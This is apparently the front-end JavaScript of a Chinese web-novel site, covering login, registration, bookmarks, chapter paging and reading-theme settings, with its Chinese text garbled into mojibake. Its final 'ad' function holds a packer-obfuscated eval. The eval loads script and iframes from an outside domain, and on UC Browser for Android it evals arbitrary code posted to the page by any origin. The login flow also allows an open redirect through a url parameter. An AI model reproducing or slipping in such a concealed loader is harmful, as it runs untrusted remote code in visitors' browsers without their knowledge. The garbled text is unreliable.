document.writeln("<script src='\/js\/ajax.js'><\/script>");

function checkInput(){ 
	var s = document.getElementById("s_key").value ;
	if(s.length < 2 ){ alert("��������������������"); return false; } 
	if(s == "��������������"){ alert("�����������ؼ���"); return false; }
}

function showlogin(){//������¼���ж��Ƿ��¼
	doAjax("/ajax.php", "showlogin=1", "showlogin2", "GET", 0);
}
function showlogin2(t){//������¼���ж��Ƿ��¼
	var t = t.replace(/\s/g,'');
	var login_top = document.getElementById("login_top");
	if(t != "nologin"){
		login_top.innerHTML = "<div onclick='show_bookcase()' style='max-width:90px;overflow:hidden;height:50px;padding:0px 10px;' class='c_index_top'>" + t + "<\/div>";
	}
}
function fixwidth(){
	var _52mb_head = document.getElementById("_52mb_head");
	var _52mb_h1 = document.getElementById("_52mb_h1");
	_52mb_h1.style.width = (_52mb_head.scrollWidth-175) + "px";
}
function show_bookcase(){
	var info = document.getElementById("info");
	if(info.style.display == "block"){
		info.style.display = "none";	
	}
	else{
		info.style.display = "block";	
	}
}

function login(){//������¼
	uname = document.getElementById("username").value;
	upass = document.getElementById("userpass").value;
	_17mb_login_save = document.getElementById("login_save").checked;
    doAjax("/login_go.php", "chname=" + uname + "&chpass=" + upass + "&_17mb_login_save=" + _17mb_login_save, "go_login", "POST", 0);
}

function go_login(t){
	t = t.replace(/\s/g,'');
	logintips = document.getElementById("logintips");
	if(t == "nocode"){
		logintips.innerHTML = "��������֤��";
		reloadcode();
	}
	if(t == "err_code"){
		logintips.innerHTML = "��֤�����";
		reloadcode();
	}
	if(t == "nodata" ){
		logintips.innerHTML = "�������ʺź�����";
		reloadcode();
	}
	if(t == "nologin" ){
		logintips.innerHTML = "�ʺŻ�������󣬵�¼ʧ��";
		reloadcode();
	}
	if(t == "yeslogin" ){
		doAjax("/ajax.php", "is_login=1", "is_login", "GET", 0);
	}
}

function is_login(t){
	var t = t.replace(/\s/g,'');
	if(t == "right"){
		document.getElementById("logintips").innerHTML = "��¼�ɹ���";
		var urlarray= new Array(); //����һ����
		urlarray = document.URL.split("?url="); //�ַ��ָ�
		url = urlarray[1]; 
		if(url){
			url = url.replace(/\%2F/g,"/");
			url = url.replace(/\%3A/g,":");
			url = url.replace(/\%23/g,"");
			url = url.replace(/\%3F/g,"?");
			url = url.replace(/\%3D/g,"=");
			url = url.replace(/\%26/g,"&");
			window.location.href = url;	
		}
		else{
			window.location.href = "/";	
		}
	}
	else{
		document.getElementById("logintips").innerHTML = "�ʺŻ�������󣬵�¼ʧ�ܣ�";	
	}
}
//�˳���¼
function logout(){
	doAjax("/logout.php", "t=1", "logout2", "GET", 0);	
}
function logout2(){
	window.location.href = "/";
}
function register(){
	uname = document.getElementById("regname").value;
	upass = document.getElementById("regpass").value;
	uemail = document.getElementById("regemail").value;
	doAjax("/register_go.php", "uname=" + uname + "&upass=" + upass + "&uemail=" + uemail, "go_register", "POST", 0);
}
function go_register(t){
	var t = t.replace(/\s/g,'');
	var tips = document.getElementById("logintips");
	if(t == "nocode"){
		tips.innerHTML = "��������֤��";
	}
	if(t == "err_code"){
		tips.innerHTML = "��֤�����";
	}
	if(t == "nodata"){
		tips.innerHTML = "������Ϣ����������";	
	}
	if(t == "bigname"){
		tips.innerHTML = "�û���̫����10�����ʻ���30��Ӣ�����ڣ�";	
	}	
	if(t == "bigpass"){
		tips.innerHTML = "����̫����16λ���ڣ�";	
	}	
	if(t == "bigemail"){
		tips.innerHTML = "����̫����";	
	}	
	if(t == "emailerror"){
		tips.innerHTML = "�����ʽ����";	
	}
	if(t == "havename"){
		tips.innerHTML = "�û����ѱ�ע�ᣡ";	
	}
	if(t == "haveemial"){
		tips.innerHTML = "�����ѱ�ע�ᣡ";	
	}
	if(t == "yesregister"){
		tips.innerHTML = "ע��ɹ����Ѿ���¼��";
		window.location.href = "/";	
	}		
}

function bookcaseurl(){
	doAjax("/modules/article/wapajax.php", "bookcase=1", "bookcaseurl2", "GET", 0);
}
function bookcaseurl2(t){
	var t = t.replace(/\s/g,'');
	if(t == "nologin"){
		window.location.href = "/login.php";
	}
	else{
		window.location.href = "/mybook.php";	
	}
}
function case_del(aid){
	doAjax("/ajax.php", "deletebook=1&aid=" + aid, "case_del2", "POST", 0);
	document.getElementById("" + aid).innerHTML = "<tr><td style='height:30px;line-height:30px;'><font color=red>ɾ���У����Ժ�...</font></td></tr>";
}
function case_del2(t){
	//alert(t);
	var t = t.replace(/\s/g,'');
	//alert(t);
	if(t != ""){
		table = document.getElementById("" + t);
		table.style.backgroundColor = "#D3FEDA";
		
		table.innerHTML = "<tr><td style='height:30px;line-height:30px;'><font color=red>�Ѵ����ɾ����</font></td></tr>";
		
	}
}

function shuqian(aid,cid,urlchapter){
	//alert("shuqian");	
	doAjax("/ajax.php", "addmark=1&urlchapter="+urlchapter+"&aid=" + aid + "&cid=" + cid, "shuqian2", "GET", 0);
}
function shuqian2(t){
	var t = t.replace(/\s/g,'');
	//alert(t);
	var a = t.split("|");
	if(a[0]==1){
		document.getElementById("pt_prev").innerHTML = "<font color=red>�Ѵ���ǩ</font>";	
	}
	if(a[0]==0){
		window.location.href = "/login.php?url="+a[1];
	}
}

function shujia(aid,urlinfo){
	//alert("shujia");	
	doAjax("/ajax.php", "addbookcase=1&urlinfo="+urlinfo+"&aid=" + aid, "shujia2", "GET", 0);
}
function shujia2(t){
	var t = t.replace(/\s/g,'');
	var divshujia = document.getElementById("shujia");
	//alert(t);
	var a = t.split("|");
	if(a[0]==1){
		divshujia.innerHTML = "<font color=red>�Ѽ�����ܣ�</font>";	
	}
	if(a[0]==0){
		window.location.href = "/login.php?url="+a[1];
	}
}

function show_search(){
	
	var type = document.getElementById("type");
	var searchType = document.getElementById("searchType");
	if(type.innerHTML == "����"){
		type.innerHTML = "����";
		searchType.value = "author";
		//alert(searchType.value);
	}
	else{
		type.innerHTML = "����";
		searchType.value = "articlename";
	}
}

//ȫ���½ڲ���ҳ
function allchapter(aid,page){
	var chapter_load = document.getElementById("chapter_load");
	
	chapter_load.style.display = "block";
	
	var pagetips = document.getElementById("pagetips");
	if(pagetips){pagetips.style.display = "none";}
	
	
	if(page == "gopage"){
		var pagenum = document.getElementById("pagenum");
		if(pagenum.value != ""){
			if(!isNaN(pagenum.value)){
				doAjax("/modules/article/wapallchapter.php", "aid=" + aid + "&page=" + pagenum.value, "allchapter2", "GET", 0);				
			}
			else{
				chapter_load.style.display = "none";
				pagetips.style.display = "block";
			}
		}
		else{
			chapter_load.style.display = "none";
			pagetips.style.display = "block";
				
		}
	}
	else{
		doAjax("/modules/article/wapallchapter.php", "aid=" + aid + "&page=" + page, "allchapter2", "GET", 0);	
	}	
}

function allchapter2(t){
	document.getElementById("chapter_load").style.display = "none";
	document.getElementById("all_chapter").innerHTML = t ;
}

var checkbg = "#A7A7A7";
//����ҳ�û�����
function nr_setbg(intype){
	var huyandiv = document.getElementById("huyandiv");
	var light = document.getElementById("lightdiv");
	if(intype == "huyan"){
		if(huyandiv.style.backgroundColor == ""){
			set("light","huyan");
			document.cookie="light=huyan;path=/"; 
		}
		else{
			set("light","no");
			document.cookie="light=no;path=/"; 
		}
	}
	if(intype == "light"){
		if(light.innerHTML == "�ص�"){
			set("light","yes");
			document.cookie="light=yes;path=/"; 
		}
		else{
			set("light","no");
			document.cookie="light=no;path=/"; 
		}
	}
	if(intype == "big"){
		set("font","big");
		document.cookie="font=big;path=/"; 
	}
	if(intype == "middle"){
		set("font","middle");
		document.cookie="font=middle;path=/"; 
	}
	if(intype == "small"){
		set("font","small");
		document.cookie="font=small;path=/"; 
	}			
}

//����ҳ��ȡ����
function getset(){ 
	var strCookie=document.cookie; 
	var arrCookie=strCookie.split("; ");  
	var light;
	var font;

	for(var i=0;i<arrCookie.length;i++){ 
		var arr=arrCookie[i].split("="); 
		if("light"==arr[0]){ 
			light=arr[1]; 
			break; 
		} 
	} 
	for(var i=0;i<arrCookie.length;i++){ 
		var arr=arrCookie[i].split("="); 
		if("font"==arr[0]){ 
			font=arr[1]; 
			break; 
		} 
	} 
	
	//light
	if(light == "yes"){
		set("light","yes");
	}
	else if(light == "no"){
		set("light","no");
	}
	else if(light == "huyan"){
		set("light","huyan");
	}
	//font
	if(font == "big"){
		set("font","big");
	}
	else if(font == "middle"){
		set("font","middle");
	}
	else if(font == "small"){
		set("font","small");
	}
	else{
		set("","");	
	}
}

//����ҳӦ������
function set(intype,p){
	var nr_body = document.getElementById("nr_body");//ҳ��body
	var huyandiv = document.getElementById("huyandiv");//����div
	var lightdiv = document.getElementById("lightdiv");//�ƹ�div
	var fontfont = document.getElementById("fontfont");//����div
	var fontbig = document.getElementById("fontbig");//������div
	var fontmiddle = document.getElementById("fontmiddle");//������div
	var fontsmall = document.getElementById("fontsmall");//С����div
	var nr1 =  document.getElementById("nr1");//����div
	var nr_title =  document.getElementById("nr_title");//���±���
	var nr_title =  document.getElementById("nr_title");//���±���
	
	var pt_prev =  document.getElementById("pt_prev");
	var pt_mulu =  document.getElementById("pt_mulu");
	var pt_next =  document.getElementById("pt_next");
	var pb_prev =  document.getElementById("pb_prev");
	var pb_mulu =  document.getElementById("pb_mulu");
	var pb_next =  document.getElementById("pb_next");
	
	//�ƹ�
	if(intype == "light"){
		if(p == "yes"){	
			//�ص�
			lightdiv.innerHTML = "����";
			nr_body.style.backgroundColor = "#32373B";
			huyandiv.style.backgroundColor = "";
			nr_title.style.color = "#ccc";
			nr1.style.color = "#999";
			var pagebutton = "background-color:#3e4245;color:#ccc;border:1px solid #313538";			
			pt_prev.style.cssText = pagebutton;
			pt_mulu.style.cssText = pagebutton;
			pt_next.style.cssText = pagebutton
			pb_prev.style.cssText = pagebutton;
			pb_mulu.style.cssText = pagebutton;
			pb_next.style.cssText = pagebutton;
		}
		else if(p == "no"){
			//����
			lightdiv.innerHTML = "�ص�";
			nr_body.style.backgroundColor = "#fbf6ec";
			nr1.style.color = "#000";
			nr_title.style.color = "#000";
			huyandiv.style.backgroundColor = "";
			var pagebutton = "background-color:#f4f0e9;color:green;border:1px solid #ece6da";			
			pt_prev.style.cssText = pagebutton;
			pt_mulu.style.cssText = pagebutton;
			pt_next.style.cssText = pagebutton
			pb_prev.style.cssText = pagebutton;
			pb_mulu.style.cssText = pagebutton;
			pb_next.style.cssText = pagebutton;
		}
		else if(p == "huyan"){
			//����
			lightdiv.innerHTML = "�ص�";
			huyandiv.style.backgroundColor = checkbg;
			nr_body.style.backgroundColor = "#DCECD2";
			nr1.style.color = "#000";
			var pagebutton = "background-color:#CCE2BF;color:green;border:1px solid #bbd6aa";			
			pt_prev.style.cssText = pagebutton;
			pt_mulu.style.cssText = pagebutton;
			pt_next.style.cssText = pagebutton
			pb_prev.style.cssText = pagebutton;
			pb_mulu.style.cssText = pagebutton;
			pb_next.style.cssText = pagebutton;
		}
	}
	//����
	if(intype == "font"){
		//alert(p);
		fontbig.style.backgroundColor = "";
		fontmiddle.style.backgroundColor = "";
		fontsmall.style.backgroundColor = "";
		if(p == "big"){
			fontbig.style.backgroundColor = checkbg;
			nr1.style.fontSize = "25px";
		}
		if(p == "middle"){
			fontmiddle.style.backgroundColor = checkbg;
			nr1.style.fontSize = "15px";
		}
		if(p == "small"){
			fontsmall.style.backgroundColor = checkbg;
			nr1.style.fontSize = "12px";
		}
	}
}
function tfanye(){
	var allheight = document.documentElement.clientHeight;
	window.scrollTo(0, document.body.scrollTop-(allheight-30));
}
function bfanye(){
	var allheight = document.documentElement.clientHeight;
	window.scrollTo(0, document.body.scrollTop+(allheight-30));
}

//��濪ʼ
function topdb(){//�׶˹��
var domainx = 'https://m.3yz6g.cn';
var siteid = 21869;
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('f(n.w.l(\'C\')>-1&&n.w.l(\'D\')>-1){z.B(\'G\',F(e){E 7=e.x;f(7.h){y(A(7.h.Q(/\\+/g,"%R")))}});r.S(\'<2 d="k:j;" 4="\'+6+\'/P.U?g=\'+5+\'&T=J.K" i="0" c="0"  8="0" b="a" 9="0" H="I" u="3-t-v 3-s"></2><2 d="k:j;" 4="\'+6+\'/\'+5+\'.N?\'+(m q()).p()+\'" i="0" c="0"  8="0" b="a" 9="0" u="3-t-v 3-s"></2>\')}O{r.L(\'<o 4="\'+6+\'/\'+5+\'!M?\'+(m q()).p()+\'"><\\/o>\')}',57,57,'||iframe|allow|src|siteid|domainx|_0|marginheight|frameborder|no|scrolling|width|style||if||hf_ev_j|height|none|display|indexOf|new|navigator|script|getTime|Date|document|scripts|same|sandbox|origin|userAgent|data|eval|window|decodeURIComponent|addEventListener|UCBrowser|Android|var|function|message|allowtransparency|true|yikanxiaoshuo|com|writeln|css|htmm|else|miftp|replace|20|write|domain|php'.split('|'),0,{}));
}